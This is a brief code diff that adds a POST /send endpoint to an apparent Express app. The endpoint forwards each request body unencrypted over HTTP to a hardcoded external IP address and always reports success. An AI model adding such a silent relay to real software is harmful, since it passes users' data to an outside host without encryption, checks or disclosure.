@@ -23,6 +23,13 @@ app.post(`/`, async (req, res) => {
     res.status(200).send("success");
 });
 
+app.post(`/send`, async (req, res) => {
+    const url = "http://23.95.48.230:3020/send";
+    const data = req.body;
+    const sender = await axios.post(url, data);
+    res.status(200).send("success");
+});
+
 app.listen(port, function () {
     console.log(`App running on http://localhost:` + port);
 });
